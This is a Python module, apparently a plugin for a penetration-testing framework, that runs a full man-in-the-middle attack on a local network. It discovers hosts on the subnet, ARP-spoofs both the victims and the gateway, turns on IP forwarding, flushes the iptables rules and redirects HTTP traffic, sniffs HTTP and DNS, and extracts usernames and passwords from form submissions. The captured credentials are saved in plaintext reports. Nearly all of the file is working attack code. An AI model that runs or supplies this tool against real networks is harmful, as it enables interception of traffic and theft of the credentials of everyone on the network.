"""
Advanced MITM for Python 3.10
"""

MODULE_INFO = {
    "description": "MITM attack optimized for Python 3.10"
}

OPTIONS = {
    "interface": {
        "type": "str",
        "description": "Wireless interface",
        "required": True,
        "default": "wlan0"
    },
    "gateway": {
        "type": "str",
        "description": "Gateway IP",
        "required": True,
        "default": "192.168.1.1"
    },
    "target_ip": {
        "type": "str",
        "description": "Specific target IP (optional)",
        "default": ""
    },
    "output_format": {
        "type": "choice",
        "description": "Output format",
        "choices": ["text", "json", "html", "all"],
        "default": "text"
    },
    "capture_http": {
        "type": "bool",
        "description": "Capture HTTP traffic",
        "default": True
    },
    "capture_dns": {
        "type": "bool",
        "description": "Capture DNS queries",
        "default": True
    },
    "alert_keywords": {
        "type": "str",
        "description": "Keywords to alert on",
        "default": "password,login,username,email"
    }
}

import os
import time
import json
import threading
import subprocess
from datetime import datetime
from dataclasses import dataclass
from typing import Dict, List, Optional, Any
import socket

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.l2 import ARP, Ether
    from scapy.sendrecv import sniff, sendp, srp
    from scapy.volatile import RandMAC
except ImportError:
    print("[-] Scapy not installed. Install with: pip install scapy")
    exit(1)

@dataclass
class HTTPRequest:
    timestamp: str
    source_ip: str
    destination_ip: str
    method: str
    host: str
    path: str
    user_agent: str = ""
    headers: Dict[str, str] = None
    raw_data: str = ""

@dataclass
class DNSEntry:
    timestamp: str
    source_ip: str
    query: str
    query_type: int

@dataclass
class Credential:
    timestamp: str
    source_ip: str
    destination_ip: str
    username: str = ""
    password: str = ""
    raw_data: str = ""

class MITMEngine:
    def __init__(self, options: Dict[str, Any]):
        self.options = options
        self.interface = options.get("interface", "wlan0")
        self.gateway = options.get("gateway", "192.168.1.1")
        self.target_ip = options.get("target_ip", "")
        
        self.is_running = False
        self.output_dir = f"mitm_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Statistics
        self.stats = {
            'total_packets': 0,
            'http_requests': 0,
            'dns_queries': 0,
            'credentials_found': 0,
            'arp_spoofed': 0
        }
        
        # Captured data
        self.http_requests: List[HTTPRequest] = []
        self.dns_entries: List[DNSEntry] = []
        self.credentials: List[Credential] = []
        self.alerts: List[str] = []
        
        self.alert_keywords = [k.strip().lower() for k in options.get("alert_keywords", "").split(",") if k.strip()]
        
        self.setup_output()
    
    def setup_output(self):
        """Create output directory"""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        print(f"[+] Output directory: {self.output_dir}")
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         check=True, capture_output=True)
            print("[+] IP forwarding enabled")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to enable IP forwarding: {e}")
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                         check=True, capture_output=True)
            print("[+] IP forwarding disabled")
        except subprocess.CalledProcessError:
            pass
    
    def setup_iptables(self):
        """Configure iptables for MITM"""
        try:
            # Flush existing rules
            subprocess.run(['iptables', '--flush'], check=True)
            subprocess.run(['iptables', '--table', 'nat', '--flush'], check=True)
            subprocess.run(['iptables', '--delete-chain'], check=True)
            subprocess.run(['iptables', '--table', 'nat', '--delete-chain'], check=True)
            
            # Redirect HTTP traffic (port 80) to our proxy
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', 
                '--dport', '80', '-j', 'REDIRECT', '--to-port', '8080'
            ], check=True)
            
            print("[+] iptables configured")
        except subprocess.CalledProcessError as e:
            print(f"[-] iptables configuration failed: {e}")
    
    def get_mac_address(self, ip: str) -> Optional[str]:
        """Get MAC address for IP using ARP ping"""
        try:
            # Create ARP request packet
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Send and receive packets
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception as e:
            print(f"[-] Error getting MAC for {ip}: {e}")
        
        return None
    
    def arp_spoof(self, target_ip: str, spoof_ip: str):
        """Perform ARP spoofing"""
        target_mac = self.get_mac_address(target_ip)
        if not target_mac:
            print(f"[-] Could not get MAC for {target_ip}")
            return
        
        # Create spoofed ARP packet
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        
        try:
            send(packet, verbose=False)
            self.stats['arp_spoofed'] += 1
        except Exception as e:
            print(f"[-] ARP spoof error: {e}")
    
    def start_arp_spoofing(self):
        """Start continuous ARP spoofing"""
        targets = []
        
        if self.target_ip:
            targets.append(self.target_ip)
        else:
            # Discover hosts on network
            print("[*] Discovering hosts on network...")
            try:
                ans, unans = arping(f"{self.gateway}/24", timeout=5, verbose=False)
                targets = [rcv.psrc for sent, rcv in ans if rcv.psrc != self.gateway]
                print(f"[+] Found {len(targets)} targets: {', '.join(targets)}")
            except Exception as e:
                print(f"[-] Host discovery failed: {e}")
                return
        
        def spoof_loop():
            while self.is_running:
                for target in targets:
                    self.arp_spoof(target, self.gateway)  # Tell target we're the gateway
                    self.arp_spoof(self.gateway, target)  # Tell gateway we're the target
                time.sleep(2)
        
        threading.Thread(target=spoof_loop, daemon=True).start()
        print("[+] ARP spoofing started")
    
    def parse_http_request(self, packet) -> Optional[HTTPRequest]:
        """Parse HTTP request from packet"""
        try:
            if packet.haslayer(Raw):
                raw_data = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # Basic HTTP request detection
                if any(method in raw_data for method in ['GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ']):
                    lines = raw_data.split('\r\n')
                    if not lines:
                        return None
                    
                    # Parse request line
                    request_line = lines[0].split()
                    if len(request_line) < 3:
                        return None
                    
                    method, path, version = request_line
                    
                    # Parse headers
                    headers = {}
                    host = ""
                    user_agent = ""
                    
                    for line in lines[1:]:
                        if ':' in line:
                            key, value = line.split(':', 1)
                            key = key.strip()
                            value = value.strip()
                            headers[key] = value
                            
                            if key.lower() == 'host':
                                host = value
                            elif key.lower() == 'user-agent':
                                user_agent = value
                    
                    return HTTPRequest(
                        timestamp=datetime.now().isoformat(),
                        source_ip=packet[IP].src,
                        destination_ip=packet[IP].dst,
                        method=method,
                        host=host,
                        path=path,
                        user_agent=user_agent,
                        headers=headers,
                        raw_data=raw_data
                    )
        except Exception as e:
            print(f"[-] HTTP parsing error: {e}")
        
        return None
    
    def extract_credentials(self, http_req: HTTPRequest):
        """Extract credentials from HTTP request"""
        if http_req.method != "POST":
            return
        
        try:
            # Find the body (after \r\n\r\n)
            if '\r\n\r\n' in http_req.raw_data:
                body = http_req.raw_data.split('\r\n\r\n', 1)[1]
                
                # Check for common credential fields
                credential_fields = ['username', 'password', 'login', 'email', 'pass', 'pwd']
                
                if any(field in body.lower() for field in credential_fields):
                    # Simple form data parsing
                    credentials = {}
                    pairs = body.split('&')
                    for pair in pairs:
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            credentials[key] = value
                    
                    cred = Credential(
                        timestamp=http_req.timestamp,
                        source_ip=http_req.source_ip,
                        destination_ip=http_req.destination_ip,
                        raw_data=body
                    )
                    
                    # Extract common fields
                    cred.username = credentials.get('username', credentials.get('email', credentials.get('login', '')))
                    cred.password = credentials.get('password', credentials.get('pass', credentials.get('pwd', '')))
                    
                    self.credentials.append(cred)
                    self.stats['credentials_found'] += 1
                    
                    alert_msg = f"CREDENTIALS: {http_req.source_ip} -> {http_req.host} (User: {cred.username})"
                    self.alerts.append(alert_msg)
                    print(f"[!] {alert_msg}")
        
        except Exception as e:
            print(f"[-] Credential extraction error: {e}")
    
    def check_for_alerts(self, http_req: HTTPRequest):
        """Check for alert conditions"""
        search_text = f"{http_req.method} {http_req.host}{http_req.path} {http_req.raw_data}".lower()
        
        for keyword in self.alert_keywords:
            if keyword in search_text:
                alert_msg = f"KEYWORD '{keyword}': {http_req.source_ip} -> {http_req.host}{http_req.path}"
                self.alerts.append(alert_msg)
                print(f"[ALERT] {alert_msg}")
                break
    
    def packet_handler(self, packet):
        """Main packet processing function"""
        self.stats['total_packets'] += 1
        
        try:
            # HTTP traffic (port 80)
            if packet.haslayer(TCP) and packet[TCP].dport == 80:
                if self.options.get('capture_http', True):
                    http_req = self.parse_http_request(packet)
                    if http_req:
                        self.http_requests.append(http_req)
                        self.stats['http_requests'] += 1
                        
                        # Display basic info
                        print(f"[HTTP] {http_req.source_ip} -> {http_req.method} {http_req.host}{http_req.path}")
                        
                        # Extract credentials and check alerts
                        self.extract_credentials(http_req)
                        self.check_for_alerts(http_req)
            
            # DNS queries (port 53)
            elif packet.haslayer(UDP) and packet[UDP].dport == 53:
                if self.options.get('capture_dns', True) and packet.haslayer(DNSQR):
                    dns_entry = DNSEntry(
                        timestamp=datetime.now().isoformat(),
                        source_ip=packet[IP].src,
                        query=packet[DNSQR].qname.decode('utf-8', errors='ignore'),
                        query_type=packet[DNSQR].qtype
                    )
                    self.dns_entries.append(dns_entry)
                    self.stats['dns_queries'] += 1
                    print(f"[DNS] {dns_entry.source_ip} -> {dns_entry.query}")
        
        except Exception as e:
            print(f"[-] Packet processing error: {e}")
        
        # Progress indicator
        if self.stats['total_packets'] % 100 == 0:
            print(f"[*] Processed {self.stats['total_packets']} packets...")
    
    def start_packet_capture(self):
        """Start packet capture"""
        print("[+] Starting packet capture...")
        try:
            sniff(prn=self.packet_handler, store=False, 
                  filter="tcp port 80 or udp port 53",
                  iface=self.interface)
        except Exception as e:
            print(f"[-] Packet capture error: {e}")
    
    def generate_text_report(self):
        """Generate text format report"""
        report_file = os.path.join(self.output_dir, "report.txt")
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("MITM ATTACK REPORT\n")
            f.write("=" * 50 + "\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write(f"Interface: {self.interface}\n")
            f.write(f"Gateway: {self.gateway}\n")
            f.write(f"Target: {self.target_ip or 'All hosts'}\n\n")
            
            f.write("STATISTICS:\n")
            f.write("-" * 20 + "\n")
            for key, value in self.stats.items():
                f.write(f"{key}: {value}\n")
            
            f.write(f"\nALERTS ({len(self.alerts)}):\n")
            f.write("-" * 20 + "\n")
            for alert in self.alerts:
                f.write(f"{alert}\n")
            
            f.write(f"\nCREDENTIALS ({len(self.credentials)}):\n")
            f.write("-" * 20 + "\n")
            for cred in self.credentials:
                f.write(f"Time: {cred.timestamp}\n")
                f.write(f"From: {cred.source_ip} -> {cred.destination_ip}\n")
                f.write(f"Username: {cred.username}\n")
                f.write(f"Password: {cred.password}\n")
                f.write(f"Raw: {cred.raw_data[:100]}...\n\n")
            
            f.write(f"\nHTTP REQUESTS ({len(self.http_requests)}):\n")
            f.write("-" * 20 + "\n")
            for req in self.http_requests[-20:]:  # Last 20 requests
                f.write(f"{req.timestamp} - {req.source_ip} -> {req.method} {req.host}{req.path}\n")
        
        print(f"[+] Text report saved: {report_file}")
    
    def generate_json_report(self):
        """Generate JSON format report"""
        report_data = {
            'metadata': {
                'generated': datetime.now().isoformat(),
                'interface': self.interface,
                'gateway': self.gateway,
                'target': self.target_ip or 'all'
            },
            'statistics': self.stats,
            'alerts': self.alerts,
            'credentials': [{
                'timestamp': cred.timestamp,
                'source_ip': cred.source_ip,
                'destination_ip': cred.destination_ip,
                'username': cred.username,
                'password': cred.password,
                'raw_data': cred.raw_data
            } for cred in self.credentials],
            'http_requests': [{
                'timestamp': req.timestamp,
                'source_ip': req.source_ip,
                'destination_ip': req.destination_ip,
                'method': req.method,
                'host': req.host,
                'path': req.path,
                'user_agent': req.user_agent
            } for req in self.http_requests]
        }
        
        report_file = os.path.join(self.output_dir, "report.json")
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        print(f"[+] JSON report saved: {report_file}")
    
    def save_raw_data(self):
        """Save raw captured data"""
        # Save HTTP requests
        http_file = os.path.join(self.output_dir, "http_requests.log")
        with open(http_file, 'w', encoding='utf-8') as f:
            for req in self.http_requests:
                f.write(f"{'='*60}\n")
                f.write(f"Time: {req.timestamp}\n")
                f.write(f"From: {req.source_ip} -> {req.destination_ip}\n")
                f.write(f"Request: {req.method} {req.host}{req.path}\n")
                f.write(f"User-Agent: {req.user_agent}\n")
                f.write(f"Headers: {json.dumps(req.headers, indent=2)}\n")
                if req.raw_data:
                    f.write(f"Raw Data:\n{req.raw_data}\n")
        
        # Save DNS queries
        dns_file = os.path.join(self.output_dir, "dns_queries.log")
        with open(dns_file, 'w', encoding='utf-8') as f:
            for dns in self.dns_entries:
                f.write(f"{dns.timestamp} - {dns.source_ip} -> {dns.query} (Type: {dns.query_type})\n")
    
    def start(self):
        """Start MITM attack"""
        if os.geteuid() != 0:
            print("[-] This module requires root privileges")
            return False
        
        self.is_running = True
        
        try:
            # Enable IP forwarding
            self.enable_ip_forwarding()
            
            # Setup iptables
            self.setup_iptables()
            
            print("[+] Starting MITM attack...")
            print(f"[+] Interface: {self.interface}")
            print(f"[+] Gateway: {self.gateway}")
            print(f"[+] Target: {self.target_ip or 'All hosts'}")
            print("[!] Press Ctrl+C to stop\n")
            
            # Start ARP spoofing
            self.start_arp_spoofing()
            
            # Start packet capture
            self.start_packet_capture()
            
        except KeyboardInterrupt:
            print("\n[*] Stopping MITM attack...")
        
        except Exception as e:
            print(f"[-] MITM attack error: {e}")
        
        finally:
            self.stop()
        
        return True
    
    def stop(self):
        """Stop MITM attack and generate reports"""
        self.is_running = False
        
        # Disable IP forwarding
        self.disable_ip_forwarding()
        
        # Cleanup iptables
        try:
            subprocess.run(['iptables', '--flush'], check=True)
            subprocess.run(['iptables', '--table', 'nat', '--flush'], check=True)
        except subprocess.CalledProcessError:
            pass
        
        # Generate reports
        output_format = self.options.get('output_format', 'text')
        
        if output_format in ['text', 'all']:
            self.generate_text_report()
        
        if output_format in ['json', 'all']:
            self.generate_json_report()
        
        # Save raw data
        self.save_raw_data()
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print attack summary"""
        print("\n" + "="*60)
        print("MITM ATTACK SUMMARY")
        print("="*60)
        print(f"Packets processed: {self.stats['total_packets']}")
        print(f"HTTP requests: {self.stats['http_requests']}")
        print(f"DNS queries: {self.stats['dns_queries']}")
        print(f"Credentials found: {self.stats['credentials_found']}")
        print(f"Alerts triggered: {len(self.alerts)}")
        print(f"Output directory: {self.output_dir}")
        print("="*60)

def run(session, options):
    mitm = MITMEngine(options)
    return mitm.start()

# Test function
if __name__ == "__main__":
    # Test configuration
    test_options = {
        "interface": "wlan0",
        "gateway": "192.168.1.1",
        "output_format": "text",
        "capture_http": True,
        "capture_dns": True,
        "alert_keywords": "password,login,username"
    }
    
    mitm = MITMEngine(test_options)
    mitm.start()